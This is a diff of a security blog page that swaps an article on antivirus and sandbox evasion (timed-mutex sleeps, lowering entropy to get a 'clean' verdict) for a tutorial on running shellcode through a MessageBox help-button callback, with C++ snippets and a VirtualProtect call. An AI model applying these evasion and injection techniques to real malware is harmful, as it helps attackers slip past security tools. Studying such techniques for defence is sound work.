@@ -9,7 +9,7 @@
      
      
     
-    <link rel="canonical" href="https://brunopincho.github.io/avEvasion/"><link rel="icon" type="image/png" sizes="192x192" href="../img/android-chrome-192x192.png" />
+    <link rel="canonical" href="https://brunopincho.github.io/MessageBoxInjection/"><link rel="icon" type="image/png" sizes="192x192" href="../img/android-chrome-192x192.png" />
 <link rel="icon" type="image/png" sizes="512x512" href="../img/android-chrome-512x512.png" />
 <link rel="apple-touch-icon" sizes="180x180" href="../img/apple-touch-icon.png" />
 <link rel="shortcut icon" type="image/png" sizes="48x48" href="../img/favicon.ico" />
@@ -19,7 +19,7 @@
 
     
  
-<title>.Antivirus Evasion Techniques - Ghosts in the shell</title>
+<title>.Shellcode injection using MessageBox - Ghosts in the shell</title>
 
 
 <link href="../css/fontawesome/css/fontawesome.min.css" rel="stylesheet">
@@ -100,7 +100,7 @@
                 
                 
                 <li property="itemListElement" typeof="ListItem">
-                    <a href="../MessageBoxInjection/" class="menu-item " property="item" typeof="WebPage">
+                    <a href="./" class="menu-item active" property="item" typeof="WebPage">
                         <span property="name">.Shellcode injection using MessageBox</span>
                     </a>
                     <meta property="position" content="1">
@@ -108,7 +108,7 @@
                 
                 
                 <li property="itemListElement" typeof="ListItem">
-                    <a href="./" class="menu-item active" property="item" typeof="WebPage">
+                    <a href="../avEvasion/" class="menu-item " property="item" typeof="WebPage">
                         <span property="name">.Antivirus Evasion Techniques</span>
                     </a>
                     <meta property="position" content="2">
@@ -172,11 +172,9 @@
     
     
         
-        
-            <a class="
+        <span class="
 
-    terminal-mkdocs-side-nav-item" href="../MessageBoxInjection/">.Shellcode injection using MessageBox</a>
-        
+    terminal-mkdocs-side-nav-item--active">.Shellcode injection using MessageBox</span>
     
     
     
@@ -191,9 +189,11 @@
     
     
         
-        <span class="
+        
+            <a class="
 
-    terminal-mkdocs-side-nav-item--active">.Antivirus Evasion Techniques</span>
+    terminal-mkdocs-side-nav-item" href="../avEvasion/">.Antivirus Evasion Techniques</a>
+        
     
     
     
@@ -223,56 +223,57 @@
 </nav><hr>
 <nav>
     <ul>
-        <li><a href="#antivirus-evasion-techniques">.Antivirus Evasion Techniques</a></li>
-        <li><a href="#sleep-evasion">Sleep evasion</a></li><li><a href="#timed-mutexes">Timed Mutexes</a></li>
+        <li><a href="#shellcode-injection-using-messagebox">.Shellcode injection using MessageBox</a></li>
+        <li><a href="#base-structures-and-apis">Base structures and APIs</a></li><li><a href="#poc">POC</a></li>
     </ul>
 </nav>
 </aside>
             <main id="terminal-mkdocs-main-content">
 <section id="mkdocs-terminal-content">
-    <h1 id="antivirus-evasion-techniques">.Antivirus Evasion Techniques</h1>
-<p>This section will showcase some neat tricks and techniques to prevent anti-virus level detection of custom malware.</p>
+    <h1 id="shellcode-injection-using-messagebox">.Shellcode injection using MessageBox</h1>
+<p>While trying to learn more about callback functions and how they can be used in native development I sort off stumbled onto a clunky code injection vector. I don't believe it's very documented so heres a blogpost.</p>
 <hr />
-<h2 id="sleep-evasion">Sleep evasion</h2>
-<p>A known evasion technique to behavioral analysis by anti-viruses and malware sandboxes is to simply delay execution to force the sandbox to timeout, this way no malicious behavior indicators are detected and our malware can remain in stealth for a bit longer.</p>
-<p>Focusing more on Windows, classic sleep evasion is usually implemented using functions such as Sleep or NtDelayExecution, but their usage is so heavily associated with malware that the unobfuscated execution of these functions might easily trigger AVs or at least raise suspicion levels.</p>
-<h2 id="timed-mutexes">Timed Mutexes</h2>
-<p>When looking back at this subject, I remembered that during my uni years, in my system's programming class, we used to program with semaphores and mutexes to synchronize threads when doing parallel computing.</p>
-<p>So a mutex is basically a global variable that will indicate if it is safe to access variables or resources shared with other threads, you can use it to define a critical area in the code, in which only one thread may run at a time. A thread when entering the critical zone may lock the mutex variable, prevent other threads from entering, only unlocking it once all operations are done. Race conditions are a type of vulnerabilities that arise when developers don't correctly use synchronization tools such as these.</p>
-<p>My idea here was to simply use mutexes to block the execution of the main thread for a given time and avoid common indicators of sandbox evasion.</p>
-<p>Normally mutexes don't timeout, so you would kinda need to lock the thread with the malicious code and time another thread to eventually unlock the mutex. But with <a href="https://cplusplus.com/reference/mutex/timed_mutex/">timed mutexes</a> (C++11) we can lock a mutex, and afterwards use the <code>try_lock_for</code> function to attempt to lock the mutex again for a given amount of time. This will place the main thread in a state of <code>Wait:WrAlertByThreadId</code>, until either the mutex variable is unlocked or the function call times out.</p>
-<p>Lets compile two examples in c++ and test it against a sandbox.</p>
-<p>First the classic sleep winapi call:<br />
-classicS.cpp</p>
-<pre><code>#include &quot;Windows.h&quot;
-
-int main()
-{
-    Sleep(5000000);
-    return 0;
-}
+<h2 id="base-structures-and-apis">Base structures and APIs</h2>
+<p>The injection technique is essentially a callback function code injection. We'll start with the structure holding everything together:</p>
+<pre><code class="language-c++">typedef struct tagMSGBOXPARAMSW {
+  UINT           cbSize;
+  HWND           hwndOwner;
+  HINSTANCE      hInstance;
+  LPCWSTR        lpszText;
+  LPCWSTR        lpszCaption;
+  DWORD          dwStyle;
+  LPCWSTR        lpszIcon;
+  DWORD_PTR      dwContextHelpId;
+  MSGBOXCALLBACK lpfnMsgBoxCallback;
+  DWORD          dwLanguageId;
+} MSGBOXPARAMSW, *PMSGBOXPARAMSW, *LPMSGBOXPARAMSW;
 </code></pre>
-<p>And the new trick, sleeping with timed mutexes:<br />
-capp_noob.cpp</p>
-<pre><code>#include &lt;mutex&gt;
-std::timed_mutex mtx;
-using namespace std::literals;
-
-int main() {
-    mtx.lock();
-    bool result = mtx.try_lock_for(20min);
-    mtx.unlock();
-
-    return 0;
-}
+<p>So tagMSGBOXPARAMSW or MSGBOXPARAMSW, is a structure that'll contain all the necessary info to assemble and display a MessageBox dialog.
+What caught my eye when reading the documentation was naturally the <code>MSGBOXCALLBACK</code> parameter, reading the description <code>A pointer to the callback function that processes help events for the message box. The callback function has the following form:</code>, confirms both that it can be used for injection and its main limitation - it needs a manual trigger and will block the main thread execution, since the callback function is triggered as a response to a click in the <code>help</code> button. To create the MessageBox I just needed to feed the structure to the <code>MessageBoxIndirectA</code> function.
+Since the technique is kinda simple, to make it more interesting I made the MSGBOXPARAMSW structure call itself, but more on that later.</p>
+<p>In the begining we initialized everything as 0x00 and set the struct size to <code>sizeof(MSGBOXPARAMS)</code> which is an alias to MSGBOXPARAMSW.</p>
+<pre><code class="language-c++">  MSGBOXPARAMS mbp = {0};
+  mbp.cbSize = sizeof(MSGBOXPARAMS);
+  mbp.hwndOwner = NULL;
+  mbp.hInstance = GetModuleHandle(NULL);
+  mbp.lpszText = L&quot;Hello world&quot;;
+  mbp.lpszCaption = L&quot;Launchpad messagebox&quot;;
 </code></pre>
-<p>The results show a clear difference:
-<img alt="placehold" src="../img/sleep_cmp.png" /></p>
-<p>After submitting both samples to a sandbox analysis on a win11 x64 VM, we can see on the left the classicS.exe behaviour was considered suspicious after submitted, but on the right we have the results for capp_noob.exe, which was considered inconclusive. This doesn't mean the technique was undetectable, just that the AV didn't have enough information to accurately classify the indicators it collected as malicious.</p>
-<p>Also ignore crowdstrike falcon's 60% malicious static detection, the dam thing would consider its own family malicious if entrophy wasn't low enough. (Bypass for this in the future). Slightly lowering the entrophy will result in this outcome for capp_noob.exe:
-<img alt="placehold" src="../img/capp_ent.png" /></p>
-<p>Which is now considered clean:
-<img alt="placehold" src="../img/capp_clean.png" /></p>
+<p>The window handle owner can be set to null, it wont make any difference, the same for hInstance.
+Since <code>lpszIcon</code> is a pointer, more specifically, <code>LPCWSTR</code>, we can cast the pointer to the shellcode buffer from <code>unsigned char*</code> to the same type. And of course we'll need the help button.</p>
+<pre><code class="language-c++">  mbp.lpszIcon = (LPCWSTR)buf;
+  mbp.dwStyle = MB_HELP;
+  mbp.dwLanguageId = MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT);
+</code></pre>
+<p>Finally we set the callback to point to the address of the MSGBOXPARAMS's icon, which is itself pointing to the shellcode buffer:</p>
+<pre><code class="language-c++">  mbp.lpfnMsgBoxCallback = (MSGBOXCALLBACK)mbp.lpszIcon;
+</code></pre>
+<p>We just need to type cast <code>LPCWSTR</code> as <code>MSGBOXCALLBACK</code> and mark the memory as executable:
+<code>VirtualProtect((LPVOID)mbp.lpszIcon, 510, PAGE_EXECUTE_READ, &amp;dwOldProtection)</code></p>
+<h2 id="poc">POC</h2>
+<p>The rest is business as usual:
+<img alt="placehold" src="../img/messagebox_inject.gif" /></p>
+<p>Cool thing about this technique is how it allows to steer away from heavily monitored windows API functions.</p>
 </section>
 
             </main>
